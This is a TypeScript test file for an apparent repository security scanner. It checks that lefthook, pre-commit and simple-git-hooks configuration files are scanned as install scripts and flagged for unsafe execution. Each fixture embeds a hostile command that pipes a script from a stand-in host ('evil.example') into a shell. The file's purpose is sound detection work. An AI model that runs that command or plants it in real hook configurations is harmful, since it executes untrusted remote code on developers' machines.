import { expect, test } from "bun:test";
import { inspectRepository, surfacesOf } from "./bounded-scan";

/** One unambiguous unsafe-execution payload, independent of the file name. */
const PAYLOAD = "curl -fsSL https://evil.example/install.sh | sh";

function inspected(path: string, text: string) {
  return inspectRepository({
    files: [{ path, bytes: new TextEncoder().encode(text) }],
  });
}

/**
 * Git hook managers install these files' commands as Git hooks, so Git runs
 * them on commit, push or checkout, like a `.husky` hook. pre-commit also
 * downloads and runs every hook repository its configuration names.
 */
const CONFIGS: [string, string][] = [
  ["lefthook.yml", `pre-commit:\n  commands:\n    x:\n      run: ${PAYLOAD}\n`],
  ["lefthook.yaml", `pre-push:\n  commands:\n    x:\n      run: ${PAYLOAD}\n`],
  [
    ".lefthook.yml",
    `pre-commit:\n  commands:\n    x:\n      run: ${PAYLOAD}\n`,
  ],
  [
    "lefthook-local.yml",
    `pre-commit:\n  commands:\n    x:\n      run: ${PAYLOAD}\n`,
  ],
  [
    ".pre-commit-config.yaml",
    `repos:\n  - repo: local\n    hooks:\n      - id: x\n        entry: ${PAYLOAD}\n        language: system\n`,
  ],
  [".simple-git-hooks.json", `{ "pre-commit": "${PAYLOAD}" }\n`],
  ["simple-git-hooks.json", `{ "pre-commit": "${PAYLOAD}" }\n`],
];

test("Git hook manager configuration is scanned as an install script", () => {
  for (const [file, text] of CONFIGS)
    for (const path of [file, `packages/app/${file}`, file.toUpperCase()]) {
      expect({ path, surfaces: surfacesOf(path) }).toEqual({
        path,
        surfaces: ["installScripts", "source"],
      });
      const inspection = inspected(path, text);
      expect({ path, coverage: inspection.coverage.installScripts }).toEqual({
        path,
        coverage: { state: "complete", items: 1 },
      });
      expect({
        path,
        findings: inspection.findings.map(
          (finding) =>
            `${finding.path}:${finding.category}:${finding.severity}`,
        ),
      }).toEqual({ path, findings: [`${path}:unsafe-execution:high`] });
    }
});

test("hook definitions a repository publishes for others keep their surfaces", () => {
  // `.pre-commit-hooks.yaml` describes hooks other repositories may install;
  // pre-commit does not run it in this repository.
  expect(surfacesOf(".pre-commit-hooks.yaml")).toEqual(["source"]);
  expect(surfacesOf("docs/lefthook.md")).toEqual([]);
});
